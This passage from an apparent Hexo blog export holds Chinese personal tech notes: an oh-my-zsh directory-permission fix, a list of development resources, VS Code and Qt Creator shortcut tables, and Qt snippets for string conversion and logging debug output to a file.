href="#目录权限问题" class="headerlink" title="目录权限问题"></a>目录权限问题</h2><p>复制或者更新zsh，重启可能会出现以下报错</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[oh-my-zsh] Insecure completion-dependent directories detected:</span><br><span class="line">drwxrwxrwx 1 ***** ***** 512 Oct 25 13:51 /home/*****/.oh-my-zsh/custom/plugins</span><br><span class="line">drwxrwxrwx 1 ***** ***** 512 Oct 25 13:49 /home/*****/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting</span><br><span class="line"></span><br><span class="line">[oh-my-zsh] For safety, we will not load completions from these directories until</span><br><span class="line">[oh-my-zsh] you fix their permissions and ownership and restart zsh.</span><br><span class="line">[oh-my-zsh] See the above list for directories with group or other writability.</span><br><span class="line"></span><br><span class="line">[oh-my-zsh] To fix your permissions you can do so by disabling</span><br><span class="line">[oh-my-zsh] the write permission of "group" and "others" and making sure that the</span><br><span class="line">[oh-my-zsh] owner of these directories is either root or your current user.</span><br><span class="line">[oh-my-zsh] The following command may help:</span><br><span class="line">[oh-my-zsh]     compaudit | xargs chmod g-w,o-w</span><br><span class="line"></span><br><span class="line">[oh-my-zsh] If the above didn't help or you want to skip the verification of</span><br><span class="line">[oh-my-zsh] insecure directories you can set the variable ZSH_DISABLE_COMPFIX to</span><br><span class="line">[oh-my-zsh] "true" before oh-my-zsh is sourced in your zshrc file.</span><br></pre></td></tr></table></figure><p>添加一下权限即可</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chmod 755 /home/*****/.oh-my-zsh/custom/plugins</span><br><span class="line">chmod 755 /home/*****/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Program</category>
        <category>Shell</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>资源整理</title>
    <url>/2018/10/16/2018-10-16-source/</url>
    <content><![CDATA[<h1 id="工作资源"><a href="#工作资源" class="headerlink" title="工作资源"></a>工作资源</h1><ul><li>私有远程git仓库: <a href="https://bitbucket.org" target="_blank" rel="noopener">Bitbucket</a>、<a href="https://about.gitlab.com/" target="_blank" rel="noopener">Gitlab</a></li><li>可以做本地项目管理的git服务器框架: <a href="https://about.gitlab.com/" target="_blank" rel="noopener">Gitlab</a></li><li>各类文档模板: <a href="http://www.officeplus.cn/Template/Home.shtml" target="_blank" rel="noopener">Office Plus</a></li><li>内网穿透转发工具: <a href="https://www.ngrok.cc/" target="_blank" rel="noopener">Sunny ngrok</a></li><li>微软相关API文档(可以查询WindowsAPI): <a href="https://msdn.microsoft.com/library/" target="_blank" rel="noopener">MSDN</a></li></ul><h1 id="工具资源"><a href="#工具资源" class="headerlink" title="工具资源"></a>工具资源</h1><h2 id="平台通用"><a href="#平台通用" class="headerlink" title="平台通用"></a>平台通用</h2><ul><li>翻墙软件: <a href="https://github.com/search?q=shadowsocks" target="_blank" rel="noopener">Shadowsocks</a><ul><li>一个比较好的shadowsocks服务器更新网址: <a href="https://github.com/Alvin9999/new-pac/wiki/ss%E5%85%8D%E8%B4%B9%E8%B4%A6%E5%8F%B7" target="_blank" rel="noopener">ss服务器</a></li></ul></li><li>文本编辑器: <a href="https://code.visualstudio.com/" target="_blank" rel="noopener">Visual Studio Code</a>、<a href="http://www.sublimetext.com/" target="_blank" rel="noopener">sublime text</a></li><li>论文编写latex软件: <a href="http://tug.org/texlive/" target="_blank" rel="noopener">texlive</a></li><li>思维导图: <a href="https://www.xmind.net/" target="_blank" rel="noopener">XMind</a></li></ul><h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h2><ul><li>微软原版系统下载: <a href="https://msdn.itellyou.cn/" target="_blank" rel="noopener">MSDN，我告诉你</a></li><li>超级方便的快速索引直达软件: <a href="https://github.com/Wox-launcher/Wox" target="_blank" rel="noopener">Wox</a></li><li>自定义鼠标动作工具: <a href="https://x-mouse-button-control.en.softonic.com/" target="_blank" rel="noopener">X-Mouse</a></li><li>Windows下的linux小系统图形化显示界面工具: <a href="https://sourceforge.net/projects/xming/" target="_blank" rel="noopener">XMing</a></li></ul><h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><ul><li>漂亮且好用的shell主题: <a href="/2018/10/25/2018-10-25-zshConfig/">zsh</a></li><li>分屏操作工具: <a href="(/2019/09/12/2019-09-12-softwareTips/#tmux)">tmux</a></li></ul><h1 id="下载资源"><a href="#下载资源" class="headerlink" title="下载资源"></a>下载资源</h1><h2 id="software"><a href="#software" class="headerlink" title="software"></a>software</h2><ul><li>跨平台C++应用开发框架: <a href="http://download.qt.io/archive/qt/" target="_blank" rel="noopener">Qt</a></li><li>keil的硬件支持包: <a href="http://www.keil.com/dd2/Pack/" target="_blank" rel="noopener">MDK5 Software Packs</a></li></ul><h1 id="学习资源"><a href="#学习资源" class="headerlink" title="学习资源"></a>学习资源</h1><h2 id="机器学习"><a href="#机器学习" class="headerlink" title="机器学习"></a>机器学习</h2><ul><li>机器学习比赛网站: <a href="https://www.kaggle.com/" target="_blank" rel="noopener">Kaggle</a></li><li>手写数字的数据集: MNIST数据集</li><li>一个好的tensorflow官方文档: <a href="https://www.w3cschool.cn/tensorflow_python/" target="_blank" rel="noopener">W3Cschool</a></li><li>零基础入门深度学习博客: <a href="https://www.zybuluo.com/hanbingtao/note/433855" target="_blank" rel="noopener">零基础入门深度学习</a></li></ul><h2 id="视频制作"><a href="#视频制作" class="headerlink" title="视频制作"></a>视频制作</h2><ul><li>视频特效学习网站: <a href="https://www.vmovier.com/series/45/1?from=series_post_intro" target="_blank" rel="noopener">电影自习室</a></li></ul>]]></content>
      <categories>
        <category>Work</category>
      </categories>
  </entry>
  <entry>
    <title>快捷键记录</title>
    <url>/2018/10/16/2018-10-16-shortcuts/</url>
    <content><![CDATA[<h1 id="默认快捷键"><a href="#默认快捷键" class="headerlink" title="默认快捷键"></a>默认快捷键</h1><h2 id="文本基础快捷键"><a href="#文本基础快捷键" class="headerlink" title="文本基础快捷键"></a>文本基础快捷键</h2><table><thead><tr><th>按键</th><th>描述</th></tr></thead><tbody><tr><td>Ctrl + Shift + End</td><td>当前位置向后全选</td></tr><tr><td>Alt + &lt;左右方向键&gt;</td><td>跳转一个单词</td></tr></tbody></table><h1 id="软件快捷键"><a href="#软件快捷键" class="headerlink" title="软件快捷键"></a>软件快捷键</h1><h2 id="vscode"><a href="#vscode" class="headerlink" title="vscode"></a>vscode</h2><h3 id="基础操作"><a href="#基础操作" class="headerlink" title="基础操作"></a>基础操作</h3><table><thead><tr><th>按键</th><th>描述</th></tr></thead><tbody><tr><td>Ctrl + Shift + P，F1</td><td>显示命令面板 Show Command Palette</td></tr><tr><td>Ctrl + P</td><td>快速打开 Quick Open</td></tr><tr><td>Ctrl + Shift + N</td><td>新窗口/实例 New window/instance</td></tr><tr><td>Ctrl + Shift + W</td><td>关闭窗口/实例 Close window/instance</td></tr></tbody></table><h3 id="基础编辑-Basic-editing"><a href="#基础编辑-Basic-editing" class="headerlink" title="基础编辑 Basic editing"></a>基础编辑 Basic editing</h3><table><thead><tr><th>按键</th><th>描述</th></tr></thead><tbody><tr><td>Ctrl+X</td><td>剪切行（空选定） Cut line (empty selection)</td></tr><tr><td>Ctrl+C</td><td>复制行（空选定）Copy line (empty selection)</td></tr><tr><td>Alt+ ↑ / ↓</td><td>向上/向下移动行 Move line up/down</td></tr><tr><td>Shift+Alt + ↓ / ↑</td><td>向上/向下复制行 Copy line up/down</td></tr><tr><td>Ctrl+Shift+K</td><td>删除行 Delete line</td></tr><tr><td>Ctrl+Enter</td><td>在下面插入行 Insert line below</td></tr><tr><td>Ctrl+Shift+Enter</td><td>在上面插入行 Insert line above</td></tr><tr><td>Ctrl+Shift+\</td><td>跳到匹配的括号 Jump to matching bracket</td></tr><tr><td>Ctrl+] / [</td><td>缩进/缩进行 Indent/outdent line</td></tr><tr><td>Home</td><td>转到行首 Go to beginning of line</td></tr><tr><td>End</td><td>转到行尾 Go to end of line</td></tr><tr><td>Ctrl+Home</td><td>转到文件开头 Go to beginning of file</td></tr><tr><td>Ctrl+End</td><td>转到文件末尾 Go to end of file</td></tr><tr><td>Ctrl+↑ / ↓</td><td>向上/向下滚动行 Scroll line up/down</td></tr><tr><td>Alt+PgUp / PgDown</td><td>向上/向下滚动页面 Scroll page up/down</td></tr><tr><td>Ctrl+Shift+[</td><td>折叠（折叠）区域 Fold (collapse) region</td></tr><tr><td>Ctrl+Shift+]</td><td>展开（未折叠）区域 Unfold (uncollapse) region</td></tr><tr><td>Ctrl+K Ctrl+[</td><td>折叠（未折叠）所有子区域 Fold (collapse) all subregions</td></tr><tr><td>Ctrl+K Ctrl+]</td><td>展开（未折叠）所有子区域 Unfold (uncollapse) all subregions</td></tr><tr><td>Ctrl+K Ctrl+0</td><td>折叠（折叠）所有区域 Fold (collapse) all regions</td></tr><tr><td>Ctrl+K Ctrl+J</td><td>展开（未折叠）所有区域 Unfold (uncollapse) all regions</td></tr><tr><td>Ctrl+K Ctrl+C</td><td>添加行注释 Add line comment</td></tr><tr><td>Ctrl+K Ctrl+U</td><td>删除行注释 Remove line comment</td></tr><tr><td>Ctrl+/</td><td>切换行注释 Toggle line comment</td></tr><tr><td>Shift+Alt+A</td><td>切换块注释 Toggle block comment</td></tr><tr><td>Alt+Z</td><td>切换换行 Toggle word wrap</td></tr></tbody></table><h3 id="导航-Navigation"><a href="#导航-Navigation" class="headerlink" title="导航 Navigation"></a>导航 Navigation</h3><table><thead><tr><th>按键</th><th>描述</th></tr></thead><tbody><tr><td>Ctrl + T</td><td>显示所有符号 Show all Symbols</td></tr><tr><td>Ctrl + G</td><td>转到行… Go to Line…</td></tr><tr><td>Ctrl + P</td><td>转到文件… Go to File…</td></tr><tr><td>Ctrl + Shift + O</td><td>转到符号… Go to Symbol…</td></tr><tr><td>Ctrl + Shift + M</td><td>显示问题面板 Show Problems panel</td></tr><tr><td>F8</td><td>转到下一个错误或警告 Go to next error or warning</td></tr><tr><td>Shift + F8</td><td>转到上一个错误或警告 Go to previous error or warning</td></tr><tr><td>Ctrl + Shift + Tab</td><td>导航编辑器组历史记录 Navigate editor group history</td></tr><tr><td>Alt + ←/→</td><td>返回/前进 Go back / forward</td></tr><tr><td>Ctrl + M</td><td>切换选项卡移动焦点 Toggle Tab moves focus</td></tr></tbody></table><h3 id="搜索和替换-Search-and-replace"><a href="#搜索和替换-Search-and-replace" class="headerlink" title="搜索和替换 Search and replace"></a>搜索和替换 Search and replace</h3><table><thead><tr><th>按键</th><th>描述</th></tr></thead><tbody><tr><td>Ctrl + F</td><td>查找 Find</td></tr><tr><td>Ctrl + H</td><td>替换 Replace</td></tr><tr><td>F3 / Shift + F3</td><td>查找下一个/上一个 Find next/previous</td></tr><tr><td>Alt + Enter</td><td>选择查找匹配的所有出现 Select all occurences of Find match</td></tr><tr><td>Ctrl + D</td><td>将选择添加到下一个查找匹配 Add selection to next Find match</td></tr><tr><td>Ctrl + K Ctrl + D</td><td>将最后一个选择移至下一个查找匹配项 Move last selection to next Find match</td></tr><tr><td>Alt + C / R / W</td><td>切换区分大小写/正则表达式/整个词 Toggle case-sensitive / regex / whole word</td></tr></tbody></table><h3 id="多光标和选择-Multi-cursor-and-selection"><a href="#多光标和选择-Multi-cursor-and-selection" class="headerlink" title="多光标和选择 Multi-cursor and selection"></a>多光标和选择 Multi-cursor and selection</h3><table><thead><tr><th>按键</th><th>描述</th></tr></thead><tbody><tr><td>Alt +单击</td><td>插入光标 Insert cursor</td></tr><tr><td>Ctrl + Alt +↑/↓</td><td>在上/下插入光标 Insert cursor above / below</td></tr><tr><td>Ctrl + U</td><td>撤消上一个光标操作 Undo last cursor operation</td></tr><tr><td>Shift + Alt + I</td><td>在选定的每一行的末尾插入光标 Insert cursor at end of each line selected</td></tr><tr><td>Ctrl + I</td><td>选择当前行 Select current line</td></tr><tr><td>Ctrl + Shift + L</td><td>选择当前选择的所有出现 Select all occurrences of current selection</td></tr><tr><td>Ctrl + F2</td><td>选择当前字的所有出现 Select all occurrences of current word</td></tr><tr><td>Shift + Alt + →</td><td>展开选择 Expand selection</td></tr><tr><td>Shift + Alt + ←</td><td>缩小选择 Shrink selection</td></tr><tr><td>Shift + Alt + （拖动鼠标）</td><td>列（框）选择 Column (box) selection</td></tr><tr><td>Ctrl + Shift + Alt +（箭头键）</td><td>列（框）选择 Column (box) selection</td></tr><tr><td>Ctrl + Shift + Alt + PgUp / PgDown</td><td>列（框）选择页上/下 Column (box) selection page up/down</td></tr></tbody></table><h3 id="丰富的语言编辑-Rich-languages-editing"><a href="#丰富的语言编辑-Rich-languages-editing" class="headerlink" title="丰富的语言编辑 Rich languages editing"></a>丰富的语言编辑 Rich languages editing</h3><table><thead><tr><th>按键</th><th>描述</th></tr></thead><tbody><tr><td>Ctrl + 空格</td><td>触发建议 Trigger suggestion</td></tr><tr><td>Ctrl + Shift + Space</td><td>触发器参数提示 Trigger parameter hints</td></tr><tr><td>Tab</td><td>Emmet展开缩写 Emmet expand abbreviation</td></tr><tr><td>Shift + Alt + F</td><td>格式化文档 Format document</td></tr><tr><td>Ctrl + K Ctrl + F</td><td>格式选定区域 Format selection</td></tr><tr><td>F12</td><td>转到定义 Go to Definition</td></tr><tr><td>Alt + F12</td><td>Peek定义 Peek Definition</td></tr><tr><td>Ctrl + K F12</td><td>打开定义到边 Open Definition to the side</td></tr><tr><td>Ctrl + .</td><td>快速解决 Quick Fix</td></tr><tr><td>Shift + F12</td><td>显示引用 Show References</td></tr><tr><td>F2</td><td>重命名符号 Rename Symbol</td></tr><tr><td>Ctrl + Shift + . /，</td><td>替换为下一个/上一个值 Replace with next/previous value</td></tr><tr><td>Ctrl + K Ctrl + X</td><td>修剪尾随空格 Trim trailing whitespace</td></tr><tr><td>Ctrl + K M</td><td>更改文件语言 Change file language</td></tr><tr><td>编辑器管理 Editor management</td><td></td></tr></tbody></table><table><thead><tr><th>按键</th><th>描述</th></tr></thead><tbody><tr><td>Ctrl+F4, Ctrl+W</td><td>关闭编辑器 Close editor</td></tr><tr><td>Ctrl+K F</td><td>关闭文件夹 Close folder</td></tr><tr><td>Ctrl+\</td><td>拆分编辑器 Split editor</td></tr><tr><td>Ctrl+ 1 / 2 / 3</td><td>聚焦到第1，第2或第3编辑器组 Focus into 1st, 2nd or 3rd editor group</td></tr><tr><td>Ctrl+K Ctrl+ ←/→</td><td>聚焦到上一个/下一个编辑器组 Focus into previous/next editor group</td></tr><tr><td>Ctrl+Shift+PgUp / PgDown</td><td>向左/向右移动编辑器 Move editor left/right</td></tr><tr><td>Ctrl+K ← / →</td><td>移动活动编辑器组 Move active editor group</td></tr></tbody></table><h3 id="文件管理-File-management"><a href="#文件管理-File-management" class="headerlink" title="文件管理 File management"></a>文件管理 File management</h3><table><thead><tr><th>按键</th><th>描述</th></tr></thead><tbody><tr><td>Ctrl+N</td><td>新文件 New File</td></tr><tr><td>Ctrl+O</td><td>打开文件… Open File…</td></tr><tr><td>Ctrl+S</td><td>保存 Save</td></tr><tr><td>Ctrl+Shift+S</td><td>另存为… Save As…</td></tr><tr><td>Ctrl+K S</td><td>全部保存 Save All</td></tr><tr><td>Ctrl+F4</td><td>关闭 Close</td></tr><tr><td>Ctrl+K Ctrl+W</td><td>关闭所有 Close All</td></tr><tr><td>Ctrl+Shift+T</td><td>重新打开关闭的编辑器 Reopen closed editor</td></tr><tr><td>Ctrl+K</td><td>输入保持打开 Enter Keep Open</td></tr><tr><td>Ctrl+Tab</td><td>打开下一个 Open next</td></tr><tr><td>Ctrl+Shift+Tab</td><td>打开上一个 Open previous</td></tr><tr><td>Ctrl+K P</td><td>复制活动文件的路径 Copy path of active file</td></tr><tr><td>Ctrl+K R</td><td>显示资源管理器中的活动文件 Reveal active file in Explorer</td></tr><tr><td>Ctrl+K O</td><td>显示新窗口/实例中的活动文件 Show active file in new window/instance</td></tr></tbody></table><h3 id="显示-Display"><a href="#显示-Display" class="headerlink" title="显示 Display"></a>显示 Display</h3><table><thead><tr><th>按键</th><th>描述</th></tr></thead><tbody><tr><td>F11</td><td>切换全屏 Toggle full screen</td></tr><tr><td>Shift+Alt+1</td><td>切换编辑器布局 Toggle editor layout</td></tr><tr><td>Ctrl+ = / -</td><td>放大/缩小 Zoom in/out</td></tr><tr><td>Ctrl+B</td><td>切换侧栏可见性 Toggle Sidebar visibility</td></tr><tr><td>Ctrl+Shift+E</td><td>显示浏览器/切换焦点 Show Explorer / Toggle focus</td></tr><tr><td>Ctrl+Shift+F</td><td>显示搜索 Show Search</td></tr><tr><td>Ctrl+Shift+G</td><td>显示Git Show Git</td></tr><tr><td>Ctrl+Shift+D</td><td>显示调试 Show Debug</td></tr><tr><td>Ctrl+Shift+X</td><td>显示扩展 Show Extensions</td></tr><tr><td>Ctrl+Shift+H</td><td>替换文件 Replace in files</td></tr><tr><td>Ctrl+Shift+J</td><td>切换搜索详细信息 Toggle Search details</td></tr><tr><td>Ctrl+Shift+C</td><td>打开新命令提示符/终端 Open new command prompt/terminal</td></tr><tr><td>Ctrl+Shift+U</td><td>显示输出面板 Show Output panel</td></tr><tr><td>Ctrl+Shift+V</td><td>切换Markdown预览 Toggle Markdown preview</td></tr><tr><td>Ctrl+K V</td><td>从旁边打开Markdown预览 Open Markdown preview to the side</td></tr></tbody></table><h3 id="调试-Debug"><a href="#调试-Debug" class="headerlink" title="调试 Debug"></a>调试 Debug</h3><table><thead><tr><th>按键</th><th>描述</th></tr></thead><tbody><tr><td>F9</td><td>切换断点 Toggle breakpoint</td></tr><tr><td>F5</td><td>开始/继续 Start/Continue</td></tr><tr><td>Shift+F5</td><td>停止 Stop</td></tr><tr><td>F11 / Shift+F11</td><td>下一步/上一步 Step into/out</td></tr><tr><td>F10</td><td>跳过 Step over</td></tr><tr><td>Ctrl+K Ctrl+I</td><td>显示悬停 Show hover</td></tr></tbody></table><h3 id="集成终端-Integrated-terminal"><a href="#集成终端-Integrated-terminal" class="headerlink" title="集成终端 Integrated terminal"></a>集成终端 Integrated terminal</h3><table><thead><tr><th>按键</th><th>描述</th></tr></thead><tbody><tr><td>Ctrl+`</td><td>显示集成终端 Show integrated terminal</td></tr><tr><td>Ctrl+Shift+`</td><td>创建新终端 Create new terminal</td></tr><tr><td>Ctrl+Shift+C</td><td>复制选定 Copy selection</td></tr><tr><td>Ctrl+Shift+V</td><td>粘贴到活动端子 Paste into active terminal</td></tr><tr><td>Ctrl+↑ / ↓</td><td>向上/向下滚动 Scroll up/down</td></tr><tr><td>Shift+PgUp / PgDown</td><td>向上/向下滚动页面 Scroll page up/down</td></tr><tr><td>Ctrl+Home / End</td><td>滚动到顶部/底部 Scroll to top/bottom</td></tr></tbody></table><h2 id="Qt"><a href="#Qt" class="headerlink" title="Qt"></a>Qt</h2><table><thead><tr><th>键值</th><th>描述</th></tr></thead><tbody><tr><td>F1</td><td>查看帮助</td></tr><tr><td>F2</td><td>跳转到函数定义（和Ctrl+鼠标左键一样的效果）</td></tr><tr><td>Shift+F2</td><td>声明和定义之间切换</td></tr><tr><td>F4</td><td>头文件和源文件之间切换</td></tr><tr><td>Ctrl+1</td><td>欢迎模式</td></tr><tr><td>Ctrl+2</td><td>编辑模式</td></tr><tr><td>Ctrl+3</td><td>调试模式</td></tr><tr><td>Ctrl+4</td><td>项目设置模式</td></tr><tr><td>Ctrl+5</td><td>帮助模式</td></tr><tr><td>Ctrl+6</td><td>输出模式</td></tr><tr><td>Alt+0</td><td>显示或者隐藏侧边条，编辑模式下起作用（有时写的函数太长，屏幕不够大，就用这个）</td></tr><tr><td>Ctrl+Space</td><td>自动补全（貌似会和输入法的切换冲突）</td></tr><tr><td>ESc</td><td>切换到编辑模式</td></tr><tr><td>Alt+1</td><td>创建细节窗口</td></tr><tr><td>Alt+2</td><td>搜索结果窗口</td></tr><tr><td>Alt+3</td><td>程序输出窗口</td></tr><tr><td>Alt+4</td><td>编译输出窗口</td></tr><tr><td>Ctrl+B</td><td>编译工程</td></tr><tr><td>Ctrl+R</td><td>运行工程</td></tr><tr><td>Ctrl+I</td><td>自动对齐</td></tr><tr><td>Ctrl+/</td><td>注释行，取消注释行</td></tr><tr><td>Ctrl+Shift+&lt;</td><td>折叠代码块</td></tr><tr><td>Ctrl+Shift+&gt;</td><td>展开代码块</td></tr><tr><td>Ctrl+[</td><td>跳到代码块的头部</td></tr><tr><td>Ctrl+]</td><td>跳到代码块的尾部</td></tr><tr><td>Ctrl+L</td><td>跳到某一行</td></tr><tr><td>Ctrl+F</td><td>查找替换当前选中的内容，按下Ctrl+F，会列出所有和你选的内容一样的语句</td></tr><tr><td>Ctrl+Shift+F</td><td>查找内容</td></tr><tr><td>F5</td><td>开始调试</td></tr><tr><td>Shift+F5</td><td>停止调试</td></tr><tr><td>F9</td><td>设置和取消断点</td></tr><tr><td>F10</td><td>单步前进</td></tr><tr><td>F11</td><td>单步进入函数</td></tr><tr><td>Shift + F11</td><td>单步跳出函数</td></tr></tbody></table>]]></content>
      <categories>
        <category>Software Usage</category>
        <category>Shortcut</category>
      </categories>
  </entry>
  <entry>
    <title>Qt笔记</title>
    <url>/2018/10/15/2018-10-15-qtStudy/</url>
    <content><![CDATA[<p>version:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Qt Creator 4.5.1</span><br><span class="line">Based on Qt 5.10.1 (MSVC 2015, 32 bit)</span><br><span class="line">Built on Feb 10 2018 04:20:12</span><br><span class="line">From revision 24cd0b1cd6</span><br></pre></td></tr></table></figure><p>操作系统: <code>windows10 Pro 1803</code></p><h1 id="qt介绍"><a href="#qt介绍" class="headerlink" title="qt介绍"></a>qt介绍</h1><h2 id="框架架构解析"><a href="#框架架构解析" class="headerlink" title="框架架构解析"></a>框架架构解析</h2><img src="/2018/10/15/2018-10-15-qtStudy/2018_10_22_02.jpg"><h1 id="公用配置"><a href="#公用配置" class="headerlink" title="公用配置"></a>公用配置</h1><h2 id="创建的文件模板修改"><a href="#创建的文件模板修改" class="headerlink" title="创建的文件模板修改"></a>创建的文件模板修改</h2><p>我修改的是<code>D:\ProgramData\Qt\Qt5.10.1\Tools\QtCreator\share\qtcreator\templates\wizards\classes\cpp</code>目录下的两个文件，可以实现修改文件创建的模板</p><h1 id="语法学习"><a href="#语法学习" class="headerlink" title="语法学习"></a>语法学习</h1><h2 id="QString"><a href="#QString" class="headerlink" title="QString"></a>QString</h2><h3 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">QString test = QString().<span class="built_in">sprintf</span>(<span class="string">"%s"</span>, <span class="string">"https://githubwyb.github.io/"</span>);</span><br></pre></td></tr></table></figure><h3 id="与std-string的相互转化"><a href="#与std-string的相互转化" class="headerlink" title="与std::string的相互转化"></a>与std::string的相互转化</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//QString转std::string</span></span><br><span class="line">QString qStr = <span class="string">"https://githubwyb.github.io/"</span>;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> str = qStr.toStdString();</span><br><span class="line"></span><br><span class="line"><span class="comment">//std::string转QString</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> str = <span class="string">"https://githubwyb.github.io/"</span>;</span><br><span class="line">QString qStr = QString::fromStdString(str);</span><br></pre></td></tr></table></figure><h2 id="QDebug"><a href="#QDebug" class="headerlink" title="QDebug"></a>QDebug</h2><h3 id="将打印格式化输出到文件"><a href="#将打印格式化输出到文件" class="headerlink" title="将打印格式化输出到文件"></a>将打印格式化输出到文件</h3><ul><li>初始化需要将messageHandler自定义一下，qt提供下面的方法进行自定义</li></ul><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*QtMessageHandler)</span><span class="params">(QtMsgType, <span class="keyword">const</span> QMessageLogContext &amp;, <span class="keyword">const</span> QString &amp;)</span></span>;</span><br><span class="line"><span class="function">Q_CORE_EXPORT QtMessageHandler <span class="title">qInstallMessageHandler</span><span class="params">(QtMessageHandler)</span></span>;</span><br></pre></td></tr></table></figure><ul><li>自定义消息的处理函数到文件中，自定义格式为：</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2018-10-17 16:17:28[D][main.cpp:11 (int qMain(int, char**))] Hello, qt</span><br></pre></td></tr></table></figure><ul><li>自定义的处理函数为下</li></ul><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">const</span> <span class="keyword">char</span> *<span class="title">splitFileName</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *fileName)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *pChar = fileName;</span><br><span class="line">    pChar = (<span class="built_in">strrchr</span>(pChar, <span class="string">'/'</span>) ? <span class="built_in">strrchr</span>(pChar, <span class="string">'/'</span>) + <span class="number">1</span> : (<span class="built_in">strrchr</span>(pChar, <span class="string">'\\'</span>) ? <span class="built_in">strrchr</span>(pChar, <span class="string">'\\'</span>) + <span class="number">1</span> : pChar));</span><br><span class="line">    <span class="keyword">return</span> pChar;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">myMessageOutput</span><span class="params">(QtMsgType type, <span class="keyword">const</span> QMessageLogContext &amp;context, <span class="keyword">const</span> QString &amp;msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> QMutex mutex;</span><br><span class="line">    mutex.lock();</span><br><span class="line"></span><br><span class="line">    QString <span class="built_in">text</span> = QDateTime::currentDateTime().toString(<span class="string">"yyyy-MM-dd hh:mm:ss"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (type)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> QtDebugMsg:</span><br><span class="line">        <span class="built_in">text</span> += QString(<span class="string">"[D]"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> QtInfoMsg:</span><br><span class="line">        <span class="built_in">text</span> += QString(<span class="string">"[I]"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> QtWarningMsg:</span><br><span class="line">        <span class="built_in">text</span> += QString(<span class="string">"[W]"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> QtCriticalMsg:</span><br><span class="line">        <span class="built_in">text</span> += QString(<span class="string">"[E]"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> QtFatalMsg:</span><br><span class="line">        <span class="built_in">text</span> += QString(<span class="string">"[F]"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">text</span> += QString(<span class="string">"[%1:%2 (%3)] %4"</span>).arg(splitFileName(context.file)).arg(context.<span class="built_in">line</span>).arg(context.function).arg(msg);</span><br><span class="line"></span><br><span class="line">    QString logFile = QCoreApplication::applicationDirPath() + <span class="string">"/log.txt"</span>;</span><br><span class="line">    <span class="function">QFile <span class="title">file</span><span class="params">(logFile)</span></span>;</span><br><span class="line">    file.<span class="built_in">open</span>(QIODevice::WriteOnly | QIODevice::Append);</span><br><span class="line">    <span class="keyword">if</span> (file.<span class="built_in">size</span>() &gt;= <span class="number">10</span> * <span class="number">1024</span> * <span class="number">1024</span>) <span class="comment">//文件达到10M后先备份再清空</span></span><br><span class="line">    &#123;</span><br><span class="line">        QFile::<span class="built_in">remove</span>(<span class="string">"log_00.txt"</span>);<span class="comment">//删除原来的备份文件</span></span><br><span class="line">        file.copy(<span class="string">"log_00.txt"</span>);    <span class="comment">//拷贝文件至备份文件</span></span><br><span class="line">        file.resize(<span class="number">0</span>);             <span class="comment">//清空文件内容</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">QTextStream <span class="title">text_stream</span><span class="params">(&amp;file)</span></span>;</span><br><span class="line">    text_stream &lt;&lt; <span class="built_in">text</span> &lt;&lt; <span class="string">"\r\n"</span>;</span><br><span class="line">    file.<span class="built_in">flush</span>();</span><br><span class="line">    file.<span class="built_in">close</span>();</span><br><span class="line"></span><br><span class="line">    mutex.unlock();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><ol><li>release版本需要在工程中.pro文件定义一个宏,然后，重新qmake，编译，不然文件和行数相关信息无法打印。</li></ol><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">DEFINES += QT_MESSAGELOGCONTEXT</span><br></pre></td></tr></table></figure><h3 id="去除打印的引号"><a href="#去除打印的引号" class="headerlink" title="去除打印的引号"></a>去除打印的引号</h3><ul><li>只能在debug版本使用，release版本会出错，暂未找解决方案</li></ul><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">QString str = <span class="string">"Hello, world"</span>;</span><br><span class="line">qDebug() &lt;&lt; qPrintable(str);</span><br></pre></td></tr></table></figure><ul><li>可以在debug和release版本使用</li></ul><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">QString str = <span class="string">"https://githubwyb.github.io/"</span>;</span><br><span class="line">qDebug(<span class="string">"%s"</span>, str.toLatin1().data());</span><br></pre></td></tr></table></figure><h2 id="目录相关接口"><a href="#目录相关接口" class="headerlink" title="目录相关接口"></a>目录相关接口</h2><h3 id="创建目录"><a href="#创建目录" class="headerlink" 